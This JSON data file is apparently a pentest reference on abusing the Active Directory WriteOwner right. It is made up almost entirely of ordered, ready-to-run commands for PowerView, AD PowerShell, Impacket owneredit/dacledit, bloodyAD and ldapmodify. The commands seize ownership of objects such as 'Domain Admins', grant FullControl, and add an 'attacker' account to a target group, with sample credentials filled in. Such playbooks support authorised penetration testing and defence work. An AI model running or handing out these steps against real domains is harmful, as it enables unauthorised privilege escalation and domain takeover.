{
    "WriteOwner": {
        "meaning": "Object owners retain the ability to modify object security descriptors, regardless of permissions on the object's DACL. To change the ownership of the object, you can use various tools to take ownership and then modify the DACL however you wish.",
        "common": "",
        "windows": {
            "PowerView": [
                {
                    "order": 1,
                    "command": "Import-Module PowerView",
                    "description": "Import PowerView module"
                },
                {
                    "order": 2,
                    "command": "$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force; $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)",
                    "description": "Create PSCredential object for authentication"
                },
                {
                    "order": 3,
                    "command": "Set-DomainObjectOwner -Credential $Cred -TargetIdentity \"Domain Admins\" -OwnerIdentity harmj0y",
                    "description": "Change ownership of target object to controlled principal"
                },
                {
                    "order": 4,
                    "command": "Add-DomainObjectAcl -TargetIdentity \"Domain Admins\" -Rights All",
                    "description": "Grant full control permissions using new ownership"
                }
            ],
            "PowerView_Simple": [
                {
                    "order": 1,
                    "command": "Import-Module PowerView",
                    "description": "Import PowerView module"
                },
                {
                    "order": 2,
                    "command": "Set-DomainObjectOwner -TargetIdentity \"TargetGroup\" -OwnerIdentity \"attacker\"",
                    "description": "Take ownership of target object"
                },
                {
                    "order": 3,
                    "command": "Add-DomainObjectAcl -TargetIdentity \"TargetGroup\" -Rights WriteMembers",
                    "description": "Grant WriteMembers permission using ownership"
                },
                {
                    "order": 4,
                    "command": "Add-DomainGroupMember -Identity \"TargetGroup\" -Members \"attacker\"",
                    "description": "Add attacker to target group"
                }
            ],
            "ActiveDirectory_PowerShell": [
                {
                    "order": 1,
                    "command": "Import-Module ActiveDirectory",
                    "description": "Import Active Directory PowerShell module"
                },
                {
                    "order": 2,
                    "command": "$acl = Get-Acl 'AD:CN=Target,CN=Users,DC=domain,DC=com'",
                    "description": "Get current ACL of target object"
                },
                {
                    "order": 3,
                    "command": "$account = New-Object System.Security.Principal.NTAccount('attacker'); $acl.SetOwner($account)",
                    "description": "Set new owner in ACL object"
                },
                {
                    "order": 4,
                    "command": "Set-Acl -Path 'AD:CN=Target,CN=Users,DC=domain,DC=com' -AclObject $acl",
                    "description": "Apply ownership change to target object"
                }
            ]
        },
        "linux": {
            "Impacket_owneredit": [
                {
                    "order": 1,
                    "command": "python3 owneredit.py -action write -new-owner 'attacker' -target-dn 'CN=Target,CN=Users,DC=domain,DC=com' domain.com/user:password",
                    "description": "Change ownership of target object using owneredit"
                },
                {
                    "order": 2,
                    "command": "python3 dacledit.py -action 'write' -rights 'FullControl' -principal 'attacker' -target 'CN=Target,CN=Users,DC=domain,DC=com' domain.com/attacker:password",
                    "description": "Grant full control permissions using new ownership"
                }
            ],
            "BloodyAD": [
                {
                    "order": 1,
                    "command": "bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASSWORD set owner 'CN=Target,CN=Users,DC=domain,DC=com' 'attacker'",
                    "description": "Change ownership of target object using BloodyAD"
                },
                {
                    "order": 2,
                    "command": "bloodyAD --host $DC_IP -d $DOMAIN -u attacker -p $PASSWORD add acl 'CN=Target,CN=Users,DC=domain,DC=com' 'attacker' 'FullControl'",
                    "description": "Add full control ACE using new ownership privilege"
                }
            ],
            "LDAP_Manual": [
                {
                    "order": 1,
                    "command": "ldapsearch -x -D 'CN=user,CN=Users,DC=domain,DC=com' -w password -h dc.domain.com -b 'CN=Target,CN=Users,DC=domain,DC=com' nTSecurityDescriptor",
                    "description": "Get current security descriptor of target object"
                },
                {
                    "order": 2,
                    "command": "# Modify security descriptor to change owner field",
                    "description": "Create modified security descriptor with new owner"
                },
                {
                    "order": 3,
                    "command": "echo -e \"dn: CN=Target,CN=Users,DC=domain,DC=com\\nchangetype: modify\\nreplace: nTSecurityDescriptor\\nnTSecurityDescriptor:: <base64_encoded_modified_descriptor>\" > change_owner.ldif",
                    "description": "Create LDIF with ownership change"
                },
                {
                    "order": 4,
                    "command": "ldapmodify -x -D 'CN=user,CN=Users,DC=domain,DC=com' -w password -h dc.domain.com -f change_owner.ldif",
                    "description": "Apply ownership change using ldapmodify"
                }
            ]
        }
    }
}
